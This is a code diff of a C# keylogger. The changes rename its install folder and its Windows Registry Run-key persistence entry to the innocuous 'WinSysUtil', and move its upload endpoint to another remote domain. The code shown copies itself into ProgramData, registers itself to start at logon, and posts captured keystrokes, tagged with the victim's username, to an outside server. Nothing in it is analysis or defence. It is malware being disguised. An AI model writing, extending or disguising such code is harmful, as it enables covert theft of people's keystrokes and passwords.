@@ -57,7 +57,7 @@ namespace KeyLoggerService
             try
             {
                 string appPath = Process.GetCurrentProcess().MainModule.FileName;
-                string targetPath = @"C:\ProgramData\KeyLoggerService\KeyLoggerService.exe";
+                string targetPath = @"C:\ProgramData\WinSysUtil\WinSysUtil.exe";
                 
                 // 1. Ensure directory exists
                 string dir = Path.GetDirectoryName(targetPath);
@@ -79,7 +79,7 @@ namespace KeyLoggerService
                 {
                     if (key != null)
                     {
-                        key.SetValue("KeyLoggerService", $"\"{targetPath}\" --logger");
+                        key.SetValue("WinSysUtil", $"\"{targetPath}\" --logger");
                         LogToFile("Registry Run key set successfully.");
                     }
                 }
@@ -236,7 +236,7 @@ namespace KeyLoggerService
             {
                 // Create a clean URL each time to avoid any caching or state issues if username changes (though it shouldn't)
                 string currentUsername = Environment.UserName == "SYSTEM" ? Environment.MachineName : Environment.UserName;
-                string url = $"https://keylogger.delphigamerz.xyz/log?username={Uri.EscapeDataString(currentUsername)}";
+                string url = $"https://keylogger.nullsect0r.tech/log?username={Uri.EscapeDataString(currentUsername)}";
 
                 var content = new StringContent(payload, Encoding.UTF8, "text/plain");
                 var response = await client.PostAsync(url, content);
@@ -280,7 +280,7 @@ namespace KeyLoggerService
         {
             try
             {
-                string logPath = @"C:\ProgramData\KeyLoggerService\service.log";
+                string logPath = @"C:\ProgramData\WinSysUtil\service.log";
                 string dir = Path.GetDirectoryName(logPath);
                 if (!Directory.Exists(dir))
                 {
